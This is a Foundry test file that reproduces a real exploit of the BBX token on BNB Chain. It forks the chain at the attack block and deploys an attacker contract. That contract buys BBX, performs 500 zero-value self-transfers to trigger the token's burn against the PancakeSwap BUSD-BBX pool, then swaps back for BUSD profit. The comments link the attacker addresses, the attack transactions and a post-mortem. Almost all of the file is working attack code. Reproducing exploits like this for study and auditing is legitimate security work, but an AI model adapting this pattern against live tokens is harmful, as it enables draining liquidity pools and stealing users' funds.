// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 11902 BUSD
// Attacker : https://bscscan.com/address/0x8aea7516b3b6aabf474f8872c5e71c1a7907e69e
// Attack Contract : https://bscscan.com/address/0x0489E8433e4E74fB1ba938dF712c954DDEA93898
// Vulnerable Contract : https://bscscan.com/address/0x6051428b580f561b627247119eed4d0483b8d28e
// Attack Tx : https://bscscan.com/tx/0x0dd486368444598610239b934dd9e8c6474a06d11380d1cfec4d91568b5ac581
// Attack Tx (Create Contract): https://bscscan.com/tx/0xf7019e1232704c3ede4ecf00b79ccf647b2cb3718b9f6972e70dc7c5170e3f91

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x6051428b580f561b627247119eed4d0483b8d28e#code

// @Analysis
// Post-mortem : https://blog.solidityscan.com/bbx-token-hack-analysis-f2e962c00ee5
// Twitter Guy : https://x.com/TenArmorAlert/status/1916312483792408688

address constant BBX = 0x67Ca347e7B9387af4E81c36cCA4eAF080dcB33E9;
address constant BUSD = 0x55d398326f99059fF775485246999027B3197955;
address constant wBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

address constant PancakeSwapV2_BUSD_BBX= 0x6051428B580f561B627247119EEd4D0483B8D28e;
address constant PancakeSwapRouterV2 = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

contract BBXToken_exp is Test {

    address attacker = makeAddr("attacker");

    function setUp() public {
        // 47626727 -> Attack block
        // 47626457 -> Create contract block

        vm.createSelectFork("bsc", 47626457 - 1); // Create contract block

        vm.label(attacker, "BBX Exploiter");
        vm.label(BBX, "BBX");
        vm.label(BUSD, "BUSD-T Stablecoin");
        vm.label(wBNB, "WBNB");
        vm.label(PancakeSwapV2_BUSD_BBX, "PancakeSwap V2: BSC-USD-BBX LP");
        vm.label(PancakeSwapRouterV2, "PancakeSwap: Router v2");

        vm.deal(attacker, 1 ether);
    }

    function testExploit() public {

        // Deploy the attack contract
        vm.prank(attacker);
        AttackerC attC = new AttackerC{value: 0.05 ether}();

        vm.roll(47626727 - 1); // Attack tx block
        vm.warp(block.timestamp + 15 * 60); // Warp time
        vm.startPrank(attacker);

        attC.attack();
        emit log_named_decimal_uint("Profit in BUSD", IERC20(BUSD).balanceOf(attacker), 18);

        vm.stopPrank();
    }
}

contract AttackerC {

    constructor() payable {
        // console.log(IPancakeRouter(payable(PancakeSwapRouterV2)).WETH()); // WBNB

        // Prepare BBX token
        uint256 balance = address(this).balance;
        address[] memory path = new address[](3);
        path[0] = wBNB;
        path[1] = BUSD;
        path[2] = BBX;
        IPancakeRouter(payable(PancakeSwapRouterV2)).swapExactETHForTokensSupportingFeeOnTransferTokens{value: balance}(
            balance,
            path,
            address(this),
            block.timestamp + 10
        );

        // console.log("Balance of BBX: ", IERC20(BBX).balanceOf(address(this)));
    }

    function attack() public {

        // console.log(IBBXToken(BBX).lastBurnTime()); // 1742375453
        // console.log(IBBXToken(BBX).lastBurnGapTime()); // 86400
        // console.log(IBBXToken(BBX).liquidityPool()); // 0x6051428b580f561b627247119eed4d0483b8d28e
        // console.log(IBBXToken(BBX).burnRate()); // 300

        for (uint256 i = 0; i < 500; i++) {
            IERC20(BBX).transfer(address(this), 0);

        }
        // console.log(IERC20(BUSD).balanceOf(PancakeSwapV2_BUSD_BBX));
        // console.log(IERC20(BBX).balanceOf(PancakeSwapV2_BUSD_BBX));

        IERC20(BBX).approve(PancakeSwapRouterV2, type(uint256).max);

        uint256 balanceOfBBX = IERC20(BBX).balanceOf(address(this));
        // console.log("Balance of BBX: ", balanceOfBBX); // 18480773819186942481

        address[] memory path = new address[](2);
        path[0] = BBX;
        path[1] = BUSD;
        IPancakeRouter(payable(PancakeSwapRouterV2)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            balanceOfBBX,
            0,
            path,
            msg.sender,
            block.timestamp + 10
        );
    }

    receive() external payable {
        // Receive BNB for the attack
    }
}


interface IBBXToken {
    function lastBurnTime() external view returns (uint256);
    function lastBurnGapTime() external view returns (uint256);
    function liquidityPool() external view returns (address);
    function burnRate() external view returns (uint256);
}